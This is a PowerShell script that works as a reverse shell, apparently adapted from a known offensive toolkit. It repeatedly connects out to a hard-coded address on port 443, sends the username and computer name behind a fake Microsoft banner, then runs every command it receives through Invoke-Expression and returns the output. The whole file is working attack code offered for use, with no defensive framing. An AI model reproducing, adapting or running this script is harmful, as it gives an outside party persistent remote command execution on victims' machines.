$IPAddress = "192.168.1.64"
$Port = "443"

while(1)
{
    try 
    {
	#Connect back if the reverse switch is used.
    	$client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)

    	$stream = $client.GetStream()
    	[byte[]]$bytes = 0..65535|%{0}

    	#Send back current username and computername
    	$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation.`n`n")
    	$stream.Write($sendbytes,0,$sendbytes.Length)

    	#Show an interactive PowerShell prompt
    	$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
    	$stream.Write($sendbytes,0,$sendbytes.Length)

    	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    	{
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
	    $data = $EncodedText.GetString($bytes,0, $i)
    	    try
    	    {
	        #Execute the command on the target.
    	    	$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
    	    catch
    	    {
                Write-Warning "Something went wrong with execution of command on the target." 
	    	Write-Error $_
            }
    	    $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
    	    $x = ($error[0] | Out-String)
    	    $error.clear()
    	    $sendback2 = $sendback2 + $x
    
	    #Return the results
    	    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    	    $stream.Write($sendbyte,0,$sendbyte.Length)
    	    $stream.Flush()  
        }
    	$client.Close()
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
    	Write-Error $_
    }

Start-Sleep -s 10
}
